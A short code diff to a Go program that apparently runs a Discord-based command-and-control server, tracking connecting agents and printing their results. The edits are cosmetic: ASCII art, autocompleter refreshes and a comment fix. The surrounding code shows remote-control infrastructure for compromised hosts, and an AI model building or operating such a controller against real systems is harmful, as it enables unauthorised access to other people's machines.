@@ -26,6 +26,7 @@ func main(){
 
 	dg.AddHandler(messageCreateor)
 
+	color.Red(cli.ASCIIArt)
 	go cli.Shell(dg)
 
 	err = dg.Open()
@@ -56,9 +57,11 @@ func messageCreateor(s *discordgo.Session, m *discordgo.MessageCreate){
 
 		// Add to the agents list
 		agents.AddNewAgent(messageJSON.AgentID, messageSplit[0], messageSplit[1], messageSplit[2])
+		cli.MainCompleter()
 	} else if messageJSON.MessageType == message.MESSAGE_DISCONNECT {
 		color.Red("\n[-] Agent " + messageJSON.AgentID + " disconnected\n")
-		agents.RemoveAgent(messageJSON.AgentID)
+		agents.RemoveAgent(messageJSON.AgentID)		
+		cli.MainCompleter()
 
 	} else if messageJSON.MessageType == message.MESSAGE_OUTPUT {
 		color.Blue("\n[!] Result from " + messageJSON.AgentID)
@@ -67,7 +70,7 @@ func messageCreateor(s *discordgo.Session, m *discordgo.MessageCreate){
 		// fmt.Println("\nNumber of attachments")
 		// fmt.Println(len(m.Attachments))
 
-		// TODO: This doesn't work :()
+		// TODO: This doesn't work :(
 		if messageJSON.HasAttachment {
 			for _, file := range m.Attachments {
 				fmt.Println(file.Filename)
